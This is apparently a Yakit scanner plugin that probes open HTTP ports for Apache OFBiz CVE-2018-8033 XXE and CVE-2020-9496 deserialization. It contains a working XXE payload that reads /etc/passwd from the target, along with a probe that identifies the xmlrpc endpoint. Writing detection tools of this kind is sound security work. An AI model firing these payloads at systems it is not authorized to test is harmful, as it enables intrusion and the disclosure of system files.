# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 



PacketPost = `POST /webtools/control/xmlrpc HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 2
Content-Type: application/xml
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}
`
//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}


//填充对应的漏洞检测规则
addRule(PacketPost,`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAnyOfSubString(header, `text/xml`)&& str.MatchAllOfRegexp(body, `root:[x*]:0:0:`){
        return true
    }
    return false
},"xxe","ofbiz-cve-2018-8033-xxe","critical","https://github.com/jamieparfet/Apache-OFBiz-XXE/blob/master/exploit.py")

num = fuzz.Strings(`{{ri(200000000,210000000,1)}}`)[0]
addRule(PacketPost,`<?xml version="1.0"?><methodCall><methodName>`+num+`</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAnyOfSubString(header, `xml`)&& str.MatchAllOfSubString(body,`methodResponse`,`No such service [` + num){
        return true
    }
    return false
},"xxe","apache-ofbiz-cve-2020-9496-xml-deserialization","critical","https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/apache_ofbiz_deserialiation.rb")


//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
